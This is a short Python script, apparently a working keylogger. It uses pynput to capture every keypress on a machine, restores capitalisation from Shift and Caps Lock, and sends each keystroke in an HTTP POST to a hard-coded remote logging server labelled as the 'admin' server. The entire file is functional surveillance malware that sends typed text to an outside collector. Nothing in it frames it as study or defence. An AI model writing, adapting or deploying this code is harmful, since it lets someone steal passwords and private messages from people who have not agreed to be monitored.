import requests
from pynput.keyboard import Listener, Key

# URL of the local Flask server where you want to send keypress data
ADMIN_SERVER_URL = 'http://192.168.236.186:5000/log'  # Change this to your server's IP address

# Track the state of Caps Lock and Shift keys
caps = False
shift = False

def send_key_to_admin(key):
    global caps, shift

    try:
        # Handle Shift and Caps Lock
        if key == Key.shift or key == Key.shift_r:
            shift = True
        elif key == Key.caps_lock:
            caps = not caps  # Toggle Caps Lock
        elif key == Key.backspace:
            # Send a special signal for backspace
            requests.post(ADMIN_SERVER_URL, json={'key': 'BACKSPACE'})
        else:
            letter = str(key).replace("'", "")  # Get readable key

            # Handle special keys (like space, enter, etc.)
            if letter == 'Key.space':
                letter = ' '
            elif letter == 'Key.enter':
                letter = '\n'
            elif letter == 'Key.tab':
                letter = '\t'  # Optional: Handle tab key

            # Handle Shift and Caps Lock for uppercase letters
            if letter.isalpha():
                if (caps and not shift) or (not caps and shift):
                    letter = letter.upper()
                else:
                    letter = letter.lower()

            # Reset Shift key after a letter is pressed
            shift = False

            # Send the key to the Flask server
            requests.post(ADMIN_SERVER_URL, json={'key': letter})

    except Exception as e:
        print(f"Failed to send keypress: {e}")

# Start listening for key presses
with Listener(on_press=send_key_to_admin) as listener:
    listener.join()
